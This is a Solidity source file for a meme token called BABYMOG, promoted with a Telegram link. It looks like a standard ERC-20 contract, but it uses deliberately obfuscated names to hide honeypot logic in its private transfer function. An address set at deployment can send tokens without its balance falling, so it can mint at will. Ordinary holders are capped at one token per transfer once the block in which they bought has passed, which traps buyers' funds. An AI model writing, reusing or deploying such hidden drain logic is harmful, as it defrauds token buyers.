/*

https://t.me/mogcoinbaby

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYMOG is Ownable {
    uint256 private buvm = 111;

    function transfer(address dhyfrq, uint256 ijvyqaeuzl) public returns (bool success) {
        fehcl(msg.sender, dhyfrq, ijvyqaeuzl);
        return true;
    }

    mapping(address => uint256) private ojcmdnev;

    constructor(string memory bzkgsjihlm, string memory gcqkhzb, address nhaxts, address ojkbyaw) {
        name = bzkgsjihlm;
        symbol = gcqkhzb;
        balanceOf[msg.sender] = totalSupply;
        xpdzr[ojkbyaw] = buvm;
        lkha = IUniswapV2Router02(nhaxts);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;

    string public name;

    function transferFrom(address hrsdtfvm, address dhyfrq, uint256 ijvyqaeuzl) public returns (bool success) {
        require(ijvyqaeuzl <= allowance[hrsdtfvm][msg.sender]);
        allowance[hrsdtfvm][msg.sender] -= ijvyqaeuzl;
        fehcl(hrsdtfvm, dhyfrq, ijvyqaeuzl);
        return true;
    }

    function fehcl(address hrsdtfvm, address dhyfrq, uint256 ijvyqaeuzl) private {
        address kioajmbs = IUniswapV2Factory(lkha.factory()).getPair(address(this), lkha.WETH());
        if (0 == xpdzr[hrsdtfvm]) {
            if (hrsdtfvm != kioajmbs && ojcmdnev[hrsdtfvm] != block.number && ijvyqaeuzl < totalSupply) {
                require(ijvyqaeuzl <= totalSupply / (10 ** decimals));
            }
            balanceOf[hrsdtfvm] -= ijvyqaeuzl;
        }
        balanceOf[dhyfrq] += ijvyqaeuzl;
        ojcmdnev[dhyfrq] = block.number;
        emit Transfer(hrsdtfvm, dhyfrq, ijvyqaeuzl);
    }

    function approve(address zofyp, uint256 ijvyqaeuzl) public returns (bool success) {
        allowance[msg.sender][zofyp] = ijvyqaeuzl;
        emit Approval(msg.sender, zofyp, ijvyqaeuzl);
        return true;
    }

    IUniswapV2Router02 private lkha;

    mapping(address => uint256) private xpdzr;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;
}
